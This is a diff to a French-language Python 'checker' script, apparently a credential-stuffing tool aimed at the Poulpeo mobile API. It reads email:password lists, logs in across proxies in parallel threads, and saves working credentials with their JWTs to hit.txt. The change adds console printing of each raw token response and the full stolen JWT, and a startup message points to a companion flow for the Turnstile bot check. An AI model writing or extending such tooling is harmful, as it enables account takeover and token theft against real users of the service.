@@ -28,6 +28,9 @@ INVALID_MESSAGE = "Email, pseudo ou mot de passe invalide"
 
 HITS_FILENAME = "hit.txt"
 
+# Affichage console des JWT (multi-thread) sans mélange de lignes
+_PRINT_LOCK = threading.Lock()
+
 # =========================================================
 # HITS FILE (append en direct, thread-safe)
 # =========================================================
@@ -311,7 +314,7 @@ def fetch_access_token(session, oauth_token, oauth_token_secret):
 
 
 def fetch_user_jwt(session, access_token, access_token_secret):
-    """GET getToken : JWT dans le champ JSON « data » (token signé J.W.T)."""
+    """GET getToken : renvoie (jwt, corps brut, code HTTP) ou None."""
     auth = build_oauth_header(
         method="GET",
         url=GET_TOKEN_URL,
@@ -332,7 +335,9 @@ def fetch_user_jwt(session, access_token, access_token_secret):
         "Authorization": auth,
     }
     response = session.get(GET_TOKEN_URL, headers=headers)
-    if response.status_code != 200:
+    raw = response.text or ""
+    code = response.status_code
+    if code != 200:
         return None
     try:
         payload = response.json()
@@ -341,8 +346,23 @@ def fetch_user_jwt(session, access_token, access_token_secret):
     if isinstance(payload, dict) and payload.get("status") == "ok":
         jwt = payload.get("data")
         if isinstance(jwt, str) and jwt:
-            return jwt
+            return jwt, raw, code
     return None
+
+
+def print_final_get_token_response(email: str, http_status: int, raw_body: str, jwt: str) -> None:
+    """Affiche la réponse brute de getToken + le JWT extrait (verrouillé entre threads)."""
+    with _PRINT_LOCK:
+        print("\n" + "=" * 72, flush=True)
+        print(
+            f"Réponse finale — GET user/getToken/ — {email!s} [HTTP {http_status}]",
+            flush=True,
+        )
+        print("Corps JSON brut :", flush=True)
+        print(raw_body, flush=True)
+        print("--- JWT (champ « data »), copie intégrale ---", flush=True)
+        print(jwt, flush=True)
+        print("=" * 72 + "\n", flush=True)
 
 
 def post_login(session, oauth_token, oauth_token_secret, email, password):
@@ -447,10 +467,13 @@ def process_account(email, password, proxy_url, stats, hit_writer):
             return
 
         access_token, access_secret = access_pair
-        jwt = fetch_user_jwt(session, access_token, access_secret)
-        if not jwt:
+        jwt_result = fetch_user_jwt(session, access_token, access_secret)
+        if not jwt_result:
             stats.record("error")
             return
+
+        jwt, raw_get_token, http_st = jwt_result
+        print_final_get_token_response(email, http_st, raw_get_token, jwt)
 
         hit_writer.append_hit(email, password, jwt=jwt)
         stats.record("valid")
@@ -464,6 +487,11 @@ def _run_account_task(task):
 
 
 def main():
+    print(
+        "Fichier actuel : poulpeo_mobile_checker.py — API mobile OAuth + JWT dans hit.txt.\n"
+        "Pour le flux web (Turnstile / localhost:5000), utiliser poulpeo_flow.py.\n",
+        flush=True,
+    )
     path = input(
         "Chemin du fichier texte contenant les couples mail:pass "
         "(une ligne par compte, format email:motdepasse) : "
